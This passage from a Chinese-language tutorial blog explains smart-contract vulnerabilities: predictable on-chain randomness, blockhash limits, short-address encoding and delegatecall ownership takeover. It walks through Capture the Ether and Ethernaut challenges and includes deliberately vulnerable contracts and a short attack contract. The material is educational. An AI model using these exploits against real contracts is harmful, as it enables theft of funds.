keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">guess</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint8</span> n<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">==</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint8</span> answer <span class=\"token operator\">=</span> <span class=\"token builtin\">uint8</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span><span class=\"token function\">blockhash</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>number <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> now<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>n <span class=\"token operator\">==</span> answer<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>分析：使用了区块链变量的伪随机数，同一笔交易中block.blockhash(block.number)和now均相同，直接再调用时让n&#x3D;&#x3D;uint8(keccak256(block.blockhash(block.number - 1), now))就可以了</p>\n<p>相应例题：</p>\n<p>capture the ether——Guess the new number：<a href=\"https://capturetheether.com/challenges/lotteries/guess-the-new-number/\">https://capturetheether.com/challenges/lotteries/guess-the-new-number/</a></p>\n<p>例三，关于blockhash只能读取最近256区块</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.4.21</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">PredictTheBlockHashChallenge</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> guesser<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bytes32</span> guess<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> settlementBlockNumber<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">PredictTheBlockHashChallenge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">==</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">isComplete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">lockInGuess</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> hash<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>guesser <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">==</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        guesser <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n        guess <span class=\"token operator\">=</span> hash<span class=\"token punctuation\">;</span>\n        settlementBlockNumber <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>number <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">settle</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> guesser<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>number <span class=\"token operator\">></span> settlementBlockNumber<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">bytes32</span> answer <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span><span class=\"token function\">blockhash</span><span class=\"token punctuation\">(</span>settlementBlockNumber<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        guesser <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>guess <span class=\"token operator\">==</span> answer<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>分析：block.blockhash这个函数，它可以获取给定的区块号的hash值，但只支持最近的256个区块，不包含当前区块，对于256个区块之前的函数将返回0，所以应该提前设置guess为0，再等待255+1个区块。</p>\n<p>相应例题：</p>\n<p>capture the ether——Predict the block hash：<a href=\"https://capturetheether.com/challenges/lotteries/predict-the-block-hash/\">https://capturetheether.com/challenges/lotteries/predict-the-block-hash/</a></p>\n<h1 id=\"4-短地址漏洞\"><a href=\"#4-短地址漏洞\" class=\"headerlink\" title=\"4.短地址漏洞\"></a>4.短地址漏洞</h1><p>正常用户从交易所取款或者转账时，先输入正确的地址，在输入小于或等于自己存储的以太币的数量，然后完成存取款。</p>\n<p>在调用函数时的input分为三个部分，接下来以erc20的transfer为例：</p>\n<p>part 1： 4字节，方法名的hash值，即transfer.selector。</p>\n<p>part 2：32字节，存储以太坊的地址，即20字节的address，未满足32字节，高位补0.</p>\n<p>part 3：32字节，需要传输的代币数量，未满足32字节则高位补0.</p>\n<p>上述三部分接合起来就是交易数据。</p>\n<p>在这个过程中，如果交易所或者钱包方没有校验用户输入的地址长度是否合法，就存在短地址漏洞。</p>\n<p>假设现在有合法地址0x1234567890123456789012345678901234567800。</p>\n<p>注意末尾的00，问题就处在地址末尾处的00，当我们将后面的00省略，然后将参数传递给智能合约时，参数将根据ABI规范进行编码。在00省略的情况下我们发送的就是19字节(38位地址)而不是20字节的标准地址，在这种情况下，EVM会自动从下一个参数的最高位拿到1个字节(2个十六进制位)来补充以达到预期长度，这就导致了段地址漏洞。</p>\n<p>比如在如下测试代码中</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.4.11</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">shortaddr</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token operator\">=></span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span>balanceOf<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        balanceOf<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1000</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balanceOf<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">>=</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        balanceOf<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">-=</span>amount<span class=\"token punctuation\">;</span>\n        balanceOf<span class=\"token punctuation\">[</span>to<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span>amount<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getbalance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> addr<span class=\"token punctuation\">)</span><span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> balanceOf<span class=\"token punctuation\">[</span>addr<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>调用transfer函数并且使用上述短地址，转账5个token，amount参数最高位的00将会被吞掉，原本的转账5token将会变成转账0x500个token即900个，所以有较大风险。</p>\n<p>不过该漏洞几乎已经被修复，还没有遇到过相应的例题。</p>\n<p>不能通过 Remix 复现，因为客户端会检查地址长度；也不能通过 sendTransaction()，因为 <code>web3</code> 中也加了保护。</p>\n<p>但是，可以使用 <strong>geth</strong> 搭建私链，使用 sendRawTransaction() 发送交易复现，可进行复现。</p>\n<h1 id=\"5-call调用漏洞\"><a href=\"#5-call调用漏洞\" class=\"headerlink\" title=\"5.call调用漏洞\"></a>5.call调用漏洞</h1><p>call调用分为call，callcode以及delegatecal 原理：</p>\n<p>先分别理解一下三种call调用的异同</p>\n<ul>\n<li>call: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境(合约的 storage)。</li>\n<li>delegatecall: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。</li>\n<li>callcode: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境。</li>\n</ul>\n<hr>\n<p>情况一：call</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281250381.png\"></p>\n<p>A合约：</p>\n<p>temp1 &#x3D; 0</p>\n<p>temp2 &#x3D; 0</p>\n<p>B合约：</p>\n<p>temp1 &#x3D; A合约地址</p>\n<p>temp2 &#x3D; 100</p>\n<p>说明：call调用后内置变量 msg 的值会修改为调用者（A合约地址），执行环境为被调用者（B合约）的运行环境(运行环境指合约的 storage)</p>\n<p>情况二：delegatecall</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281250351.png\"></p>\n<p>A合约：</p>\n<p>temp1 &#x3D; 调用A合约的以太坊账号地址</p>\n<p>temp2 &#x3D; 100</p>\n<p>B合约：</p>\n<p>temp1 &#x3D; 0</p>\n<p>temp2 &#x3D; 0</p>\n<p>说明：delegatecall调用后内置变量 msg 的值不会修改为调用者（A合约地址），但执行环境为调用者（A合约）的运行环境</p>\n<p>情况三：callcode</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281250982.png\"></p>\n<p>callcode在solidity 0.5.0之后就被改变成了delegatecal</p>\n<p>A合约：</p>\n<p>temp1 &#x3D; A合约地址</p>\n<p>temp2 &#x3D; 100</p>\n<p>B合约：</p>\n<p>temp1 &#x3D; 0</p>\n<p>temp2 &#x3D; 0</p>\n<p>说明：callcode调用后内置变量 msg 的值会修改为调用者（A合约地址），但执行环境为调用者（A合约）的运行环境。</p>\n<p>例：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Delegate</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    owner <span class=\"token operator\">=</span> _owner<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Delegation</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n  Delegate delegate<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _delegateAddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    delegate <span class=\"token operator\">=</span> <span class=\"token function\">Delegate</span><span class=\"token punctuation\">(</span>_delegateAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> result<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>delegate<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">delegatecall</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>分析：使用delegatecall，将会在调用者环境下执行，delegatecal即可修改合约中的owner</p>\n<p>attack：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> target <span class=\"token operator\">=</span><span class=\"token number\">0xd2a5bC10698FD955D1Fe6cb468a17809A08fd005</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bytes4</span> <span class=\"token keyword\">public</span> result<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">trandform</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n    result<span class=\"token operator\">=</span><span class=\"token builtin\">bytes4</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn()\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>\n    target<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>源码层面：</p>\n<pre class=\"line-numbers language-go\" data-language=\"go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">Call</span><span class=\"token punctuation\">(</span>env vm<span class=\"token punctuation\">.</span>Environment<span class=\"token punctuation\">,</span> caller vm<span class=\"token punctuation\">.</span>ContractRef<span class=\"token punctuation\">,</span> addr common<span class=\"token punctuation\">.</span>Address<span class=\"token punctuation\">,</span> input <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">,</span> gas<span class=\"token punctuation\">,</span> gasPrice<span class=\"token punctuation\">,</span> value <span class=\"token operator\">*</span>big<span class=\"token punctuation\">.</span>Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>ret <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">,</span> err <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\tret<span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> err <span class=\"token operator\">=</span> <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> env<span class=\"token punctuation\">,</span> caller<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>addr<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>addr<span class=\"token punctuation\">,</span> env<span class=\"token punctuation\">.</span><span class=\"token function\">Db</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">GetCodeHash</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> input<span class=\"token punctuation\">,</span> env<span class=\"token punctuation\">.</span><span class=\"token function\">Db</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">GetCode</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> gas<span class=\"token punctuation\">,</span> gasPrice<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> ret<span class=\"token punctuation\">,</span> err\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// CallCode executes the given address' code as the given contract address</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">CallCode</span><span class=\"token punctuation\">(</span>env vm<span class=\"token punctuation\">.</span>Environment<span class=\"token punctuation\">,</span> caller vm<span class=\"token punctuation\">.</span>ContractRef<span class=\"token punctuation\">,</span> addr common<span class=\"token punctuation\">.</span>Address<span class=\"token punctuation\">,</span> input <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">,</span> gas<span class=\"token punctuation\">,</span> gasPrice<span class=\"token punctuation\">,</span> value <span class=\"token operator\">*</span>big<span class=\"token punctuation\">.</span>Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>ret <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">,</span> err <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\tcallerAddr <span class=\"token operator\">:=</span> caller<span class=\"token punctuation\">.</span><span class=\"token function\">Address</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\tret<span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> err <span class=\"token operator\">=</span> <span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> env<span class=\"token punctuation\">,</span> caller<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>callerAddr<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>addr<span class=\"token punctuation\">,</span> env<span class=\"token punctuation\">.</span><span class=\"token function\">Db</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">GetCodeHash</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> input<span class=\"token punctuation\">,</span> env<span class=\"token punctuation\">.</span><span class=\"token function\">Db</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">GetCode</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> gas<span class=\"token punctuation\">,</span> gasPrice<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> ret<span class=\"token punctuation\">,</span> err\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// DelegateCall is equivalent to CallCode except that sender and value propagates from parent scope to child scope</span>\n<span class=\"token keyword\">func</span> <span class=\"token function\">DelegateCall</span><span class=\"token punctuation\">(</span>env vm<span class=\"token punctuation\">.</span>Environment<span class=\"token punctuation\">,</span> caller vm<span class=\"token punctuation\">.</span>ContractRef<span class=\"token punctuation\">,</span> addr common<span class=\"token punctuation\">.</span>Address<span class=\"token punctuation\">,</span> input <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">,</span> gas<span class=\"token punctuation\">,</span> gasPrice <span class=\"token operator\">*</span>big<span class=\"token punctuation\">.</span>Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>ret <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">,</span> err <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\tcallerAddr <span class=\"token operator\">:=</span> caller<span class=\"token punctuation\">.</span><span class=\"token function\">Address</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\toriginAddr <span class=\"token operator\">:=</span> env<span class=\"token punctuation\">.</span><span class=\"token function\">Origin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\tcallerValue <span class=\"token operator\">:=</span> caller<span class=\"token punctuation\">.</span><span class=\"token function\">Value</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\tret<span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> err <span class=\"token operator\">=</span> <span class=\"token function\">execDelegateCall</span><span class=\"token punctuation\">(</span>env<span class=\"token punctuation\">,</span> caller<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>originAddr<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>callerAddr<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>addr<span class=\"token punctuation\">,</span> env<span class=\"token punctuation\">.</span><span class=\"token function\">Db</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">GetCodeHash</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> input<span class=\"token punctuation\">,</span> env<span class=\"token punctuation\">.</span><span class=\"token function\">Db</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">GetCode</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> gas<span class=\"token punctuation\">,</span> gasPrice<span class=\"token punctuation\">,</span> callerValue<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> ret<span class=\"token punctuation\">,</span> err\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>三个地址分别对应为caller，execute env和codeaddr</p>\n<p>相应例题</p>\n<p>ethernaut第六题——delegation</p>\n<p><a href=\"https://ethernaut.openzeppelin.com/level/0x9451961b7Aea1Df57bc20CC68D72f662241b5493\">https://ethernaut.openzeppelin.com/level/0x9451961b7Aea1Df57bc20CC68D72f662241b5493</a></p>\n<p>call调用：</p>\n<p>我现在能想到的关于call调用的漏洞就只有两个，一个是重入</p>\n<p>重入在基础漏洞的第一篇就已经说过了</p>\n<p><a href=\"https://www.notion.so/d1727bc0a944423baf2f0f2611fa1500\">关于转账的漏洞 </a></p>\n<p>还有一个就是权限绕过，参考vnctf里边的vnloan那道题吧，之前发过博客，这里就不在说了</p>\n<p><a href=\"https://tttang.com/archive/1445/\">VNCTF2022公开赛 Blockchain-VNloan - 跳跳糖</a></p>\n<p>还有就是关于callcode的例题，目前还没遇到过，等遇到了，我再补到这里</p>\n<h1 id=\"6-未初始化的存储指针\"><a href=\"#6-未初始化的存储指针\" class=\"headerlink\" title=\"6.未初始化的存储指针\"></a>6.未初始化的存储指针</h1><p>原理：未初始化的存储指针是指在 EVM 中未进行初始化的 storage 